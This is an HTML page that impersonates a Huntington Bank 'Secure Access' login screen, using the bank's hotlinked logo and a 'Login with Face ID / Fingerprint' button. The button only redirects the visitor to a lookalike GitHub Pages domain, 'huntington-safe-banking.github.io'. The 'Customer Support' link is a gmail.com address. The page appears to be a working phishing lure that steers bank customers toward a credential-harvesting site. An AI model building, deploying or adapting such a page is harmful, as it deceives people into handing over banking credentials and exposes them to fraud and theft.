<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Huntington Bank - Secure Access</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    :root {
      --bg-color: #f5f5f5;
      --text-color: #000;
      --button-bg: #2d822a;
      --button-hover: #24691e;
      --link-color: #2d822a;
    }

    [data-theme='dark'] {
      --bg-color: #1e1e1e;
      --text-color: #fff;
      --button-bg: #3aa850;
      --button-hover: #2a8040;
      --link-color: #5ecc6c;
    }

    body {
      font-family: sans-serif;
      text-align: center;
      padding: 50px;
      background-color: var(--bg-color);
      color: var(--text-color);
      transition: background-color 0.3s, color 0.3s;
    }

    .logo {
      margin-bottom: 30px;
    }

    .logo img {
      width: 250px;
      height: auto;
    }

    h1 {
      color: var(--text-color);
      font-size: 24px;
    }

    p {
      font-size: 16px;
      margin-bottom: 30px;
    }

    button {
      padding: 15px 25px;
      font-size: 18px;
      background-color: var(--button-bg);
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: var(--button-hover);
    }

    .contact {
      margin-top: 40px;
      font-size: 16px;
    }

    a {
      color: var(--link-color);
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    .theme-switch {
      position: absolute;
      top: 20px;
      right: 20px;
    }

    .theme-switch label {
      font-size: 14px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="theme-switch">
    <label>
      <input type="checkbox" id="themeToggle"> Dark Mode
    </label>
  </div>

  <div class="logo">
    <img src="https://www.huntington.com/-/media/hcom/global/logo/lockup.svg" alt="Huntington Bank Logo">
  </div>

  <h1>Welcome to Huntington Bank</h1>
  <p>Secure biometric authentication is required to proceed.</p>

  <button onclick="biometricLogin()">Login with Face ID / Fingerprint</button>

  <div class="contact">
    <h3>Need Help?</h3>
    <p><a href="mailto:huntington.services.help@gmail.com">Contact Customer Support</a></p>
  </div>

  <script>
    function biometricLogin() {
      window.location.href = "https://huntington-safe-banking.github.io/huntington.com/";
    }

    const toggle = document.getElementById('themeToggle');
    toggle.addEventListener('change', function() {
      document.documentElement.setAttribute('data-theme', this.checked ? 'dark' : 'light');
    });

    // Initialize to light mode
    document.documentElement.setAttribute('data-theme', 'light');
  </script>

</body>
</html>
